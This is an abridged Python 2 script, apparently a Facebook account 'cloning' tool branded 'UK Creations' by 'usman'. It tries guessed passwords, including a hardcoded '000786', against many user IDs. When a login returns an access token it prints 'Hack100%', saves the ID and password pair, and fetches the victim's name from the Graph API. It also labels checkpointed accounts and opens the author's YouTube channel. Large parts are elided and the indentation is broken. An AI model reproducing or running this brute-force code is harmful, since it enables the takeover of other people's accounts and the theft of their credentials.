...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://m.youtube.com/channel/UCr-RK_K-WNAvuZClSmTy8qw')
    else:
	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				os.system('xdg-open https://www.youtube.com/channel/UCr-RK_K-WNAvuZClSmTy8qw')
...
def menu():
	...
	print "    \033[1;32;40m[type2] \033[1;32;40m‹•.•›Update"																														
	print "    \033[1;32;40m[type0] \033[1;34;40m‹•.•›Logout"
	pilih()
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print logo
		print "\033[1;97m•◈•═══\033[1;92mUSMAN\033[1;97m═══•◈•"
		...
		print "\033[1;95m•◈•══════•◈\033[1;97musman\033[1;95m◈•══════•◈•"
		try:
	...
	print "   \033[1;92m◄══════════════════usman══════════════════►"

	jalan('          \033[1;91muk start cloning Wait...')
	print  "  \033[1;92m ◄══════════════════khan══════════════════►" 
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b[1;94m[  ✓  ] \x1b[1;92muk-Hack100%'											
				...
				oks.append(user+pass1)
				    ...
				    print '\x1b[1;94m[ ❥ ] \x1b[1;94muk-Cp'
					       ...
					       if 'access_token' in q:	
						       ...
						       oks.append(user+pass3)
						           ...
						           pass4 = '000786'										
						                   ...
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;94m[  ✓  ] \x1b[1;92mUL-Hack100%'											
				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user											
	...
	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 UK.py)↩\033[1;97m....'
...
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ..UK Creations.. \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Facebook
              \033[1;91musman5454
"""
